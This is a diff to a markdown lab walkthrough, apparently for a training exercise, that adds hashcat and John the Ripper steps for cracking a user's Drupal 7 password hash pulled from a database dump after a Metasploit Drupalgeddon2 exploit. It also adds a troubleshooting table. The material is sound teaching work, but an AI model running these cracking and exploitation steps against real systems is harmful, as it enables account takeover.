@@ -211,30 +211,91 @@ uid | name  | mail              | pass
 
 ### Q2 — Crack john's password
 
+> 🚨 **CRITICAL — switch back to Kali BEFORE running hashcat.** During Task 2 you ran `msfconsole → Drupalgeddon2 → shell`, which dropped you into a shell **on the Drupal target VM**. The target does NOT have hashcat installed — only Kali does. If you try `hashcat` from inside the meterpreter shell, you'll see:
+> ```
+> /bin/sh: 2: hashcat: not found
+> ```
+>
+> **Fix — exit back to Kali first:**
+> ```
+> exit            ← exits the shell, back to meterpreter
+> exit            ← exits meterpreter, back to msf6 prompt
+> exit            ← exits msfconsole, back to Kali bash
+> ```
+> Verify you're on Kali:
+> ```bash
+> whoami; hostname
+> # Must print: kali / kali
+> ```
+> If the output is anything else (e.g. `www-data`, `root` on a non-Kali host), keep typing `exit` until you see `kali@kali:~$`.
+
+> 🧠 **MEMORIZE this rule:** **hashcat always runs on Kali, never on the target.** The target is what you attack; Kali is where you crack hashes.
+
 #### 2.1 — Get the hash from the DB dump (Drupal 7 hash format starts with `$S$`)
+
+From the Task 2 DB dump, copy john's full `$S$D...` hash. Then on **Kali** (not the target):
 ```bash
-# Save the hash to a file
-echo '$S$D...rest_of_hash' > /tmp/john.hash
+# Save the hash to a file — use echo -n to avoid trailing newline
+echo -n '$S$D...paste_johns_full_hash...' > /tmp/john.hash
+
+# Verify the file is clean (no trailing newline, no extra characters)
+cat /tmp/john.hash; echo "[end]"
+# Should print: $S$D...whatever[end]  ← [end] right after, no blank line
 ```
+
+> ⚠️ **Watch for these common pitfalls:**
+> - Don't include the username prefix (`john:` or `admin:`) — mode 7900 wants ONLY the hash
+> - Don't include trailing whitespace or `\n` — use `echo -n` not plain `echo`
+> - Don't truncate — the full hash is ~55 characters starting with `$S$D`
 
 #### 2.2 — Crack with hashcat
 Drupal 7 hash mode = `7900` in hashcat:
 ```bash
 hashcat -m 7900 /tmp/john.hash /usr/share/wordlists/rockyou.txt
 ```
+
+> 🧠 **WATCH FOR TYPOS in the path.** The folder is **`wordlists`** (w-o-r-d-l-i-s-t-s), not `wordlsits`. A typo here causes `No such file or directory`.
+
+If `rockyou.txt` is missing (only `.gz` exists), extract it first:
+```bash
+sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz
+ls -la /usr/share/wordlists/rockyou.txt
+# Expect: ~134 MB plain text file
+```
+
 Wait ~5–30 sec. Hashcat will print:
 ```
 $S$D...:password123
+
+Status...........: Cracked
 ```
 
-Or with John the Ripper:
+Show the cracked result anytime later:
+```bash
+hashcat -m 7900 /tmp/john.hash --show
+# Output: $S$D...:password123
+```
+
+Or with John the Ripper as a fallback:
 ```bash
 john --format=drupal7 --wordlist=/usr/share/wordlists/rockyou.txt /tmp/john.hash
+john --show --format=drupal7 /tmp/john.hash
 ```
 
 📸 **Screenshot hashcat showing the cracked password.**
 
 **Answer Q2:** *"john's password is `password123`, cracked using hashcat mode 7900 (Drupal 7) against rockyou.txt wordlist in under 1 minute."*
+
+#### Common errors at this step
+
+| Error | Cause | Fix |
+|---|---|---|
+| `/bin/sh: hashcat: not found` | You're inside meterpreter shell on the target, not on Kali | Type `exit` until `whoami` returns `kali` |
+| `No such file or directory: /usr/share/wordlsits/rockyou.txt` | Typo — `wordlsits` instead of `wordlists` | Re-type carefully: `wordlists` |
+| `No hashes loaded` | Hash file empty or has username prefix | `cat /tmp/john.hash` to inspect; re-save without the `username:` prefix |
+| `Token length exception` | Hash truncated or mangled | Re-copy full `$S$D...` (about 55 chars) |
+| Hashcat opens then immediately exits with no result | Already cracked previously — check with `hashcat -m 7900 /tmp/john.hash --show` | Re-run with `--show` to see cached crack |
+| `Cannot allocate memory` / OpenCL errors | VM has no GPU; hashcat tries OpenCL | Add `-D 1 --force --workload-profile 1` to use CPU only |
 
 ### Q3 — Sensitive info in john's home directory
 
